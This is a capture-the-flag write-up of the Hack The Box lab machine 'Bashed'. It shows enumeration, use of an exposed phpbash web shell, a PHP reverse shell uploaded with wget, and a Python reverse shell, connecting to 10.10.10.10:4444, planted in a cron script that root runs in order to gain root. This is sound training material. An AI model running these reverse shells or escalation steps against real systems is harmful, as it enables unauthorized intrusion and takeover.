---
layout: post
title: HTB Bashed 
date: 6/27/2020
future: true
---
### Box Credits  
This box was released on December 9th, 2017. 
The Author of this box is Arrexel.

## Summary
Bashed is an easy box that was worth 20 points.
This is a beginner friendly box that covers basic web enumeration and priviledge escalation


# Recon

## Nmap 
We begin our reconnaissance by running an Nmap scan checking default scripts and checking service versions.

```console
# Nmap 7.80 scan initiated Sat Jun 20 17:04:49 2020 as: nmap -T4 -p0-65535 -sC -sV -oA all 10.10.10.68
Warning: 10.10.10.68 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.68
Host is up (0.054s latency).
Not shown: 65519 closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
1547/tcp  filtered laplink
7234/tcp  filtered unknown
7468/tcp  filtered unknown
8203/tcp  filtered unknown
11470/tcp filtered unknown
18264/tcp filtered unknown
20445/tcp filtered unknown
20586/tcp filtered unknown
22481/tcp filtered unknown
25357/tcp filtered unknown
38058/tcp filtered unknown
45610/tcp filtered unknown
46819/tcp filtered unknown
55861/tcp filtered unknown
64132/tcp filtered unknown
64346/tcp filtered unknown

```
We can ignore all the filtered ports. The only one we are interested in is the http service on port 80
Lets take a look at the website 

![Github](./images/phpbash.png)


The site gives us a hint as to what kind of technology it is using, however it does not give us too much to work with on it's surface.
We will run gobuster to further enumerate the site.

```console
/images (Status: 301)
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/fonts (Status: 301)

```
checking the /dev directory gives us access to a php web shell that was displayed on the main site.

![Github](./images/bashed/dev.png)



# Foothold 

Accessing "phpbash.php" gives us access to a webshell. WE can run commands and even get the user flag!

![Github](./images/bashed/webshell.png)

## Upgrading our shell

We can technically enumerate the box from this webshell however, this is not ideal. You can use wget to download enumeration scripts to the webshell.
The issue is that to run your scripts you will need to run the command "bash <your script>" for them to execute.
The reason for this is due to the fact that the webshell is not persistent so we will need to upload a php reverse shell.

You can grab a php reverse shell found in the "/usr/share/webshells/php/php-reverse-shell.php" path within kali.
Make sure to edit the script 

```php

$VERSION = "1.0";
$ip = '10.10.10.10';  //  CHANGE THIS
$port = 4444;   //  CHANGE THIS

```

Now set up your simple python server and upload it using wget.

![Github](./images/bashed/wget.png)

Now set up your netcat and access your reverseshell by going to the web directory you uploaded it to. In my case I uploaded my shell into the uploads directory.
"10.10.10.68/uploads/myshell.php"

Once you have your reverse shell, we can clean it up with python.

```console

python -c 'import pty;pty.spawn("/bin/bash")'

```
Then background your session and run the command `stty raw echo` the use `fg` to return your background session to the foreground.

# Privilege Escalation

We will upload linpeas.sh part of the Privilege Escalation Awesome Scripts SUITE to further enumerate the box. 
This script can be found here https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

After running the script we find that we www-data can run commands as scriptmanager 

![Github](./images/bashed/sudo.png)

Since we can run sudo on the scriptmanager user, we can pviot to this user using the command `sudo -u scriptmanager bash` 

![Github](./images/bashed/scriptmanager.png)

If we snoop around as scriptmanager we find a strange directory named `scripts`
Looking at the contents of this directory we find two files.
One named test.py and test.txt

![Github](./images/bashed/files.png)

We can see that test.py is ownd by scriptmanager but was last modified in 2017 however, test.txt is owned by root as was recently modified.
Lets look at the contents of test.py

```python

f = open("test.txt", "w")
f.write("testing 123!")
f.close

```

The python code seems to write to test.txt every minute. We can exploit this by editing the script to write a reverse shell to the file owned py root.
You can grab a simple python reverse-shell from pentestmonky here http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

The code should look like this. Also make sure to edit the script for your machine ip and port.

```python

import socket, subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10", 4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

```

Unfortunately, this machine does not have vim so you will need to use vi instead. The vi editor can be a pain so I just copied this code into a text editor on my box. 

![Github](./images/bashed/mousepad.png)

Then I copied it to the machine.

![Github](./images/bashed/code.png)

Now set netcat to listen in on the port you set in your script and wait. If you run the script manually, you will only get a shell back as scriptmanager.


![Github](./images/bashed/code.png)

You should now have a root shell as seen above.

# Conclusion
This was an easy box that covers some basic fundamentals of web-site enumeration and privilege escalation. It also demonstrates the difference a persistent shell and a non persistent shell. 

# References 
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
